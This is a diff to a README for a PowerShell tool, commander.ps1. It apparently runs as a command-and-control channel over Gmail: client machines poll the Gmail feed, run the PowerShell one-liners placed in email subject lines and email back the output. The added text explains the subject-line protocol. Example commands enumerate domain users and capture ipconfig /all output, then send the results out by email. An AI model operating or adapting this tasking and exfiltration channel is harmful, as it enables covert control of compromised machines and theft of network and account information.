@@ -32,3 +32,10 @@ Examples: All One Liner commands
 # Get domain users (Net user /domain) but parsed for powershell output
 .\commander.ps1 '$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}; sendemail $output ~123434'
 
+# How it Works
+This script utilizes the GMAIL rss feed "https://mail.google.com/mail/feed/atom" and parses the subject lines of the emails. 
+The '~' is the delimiter between the powershell command at the front of the subject and the client names at the end.
+
+.\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434:343454:32233'
+
+Currently the script accepts a single input that is the PS ONELINER, an optional sendmail, followed by the '~' and then $client_names which there can be multiple but should be seperated by colons.
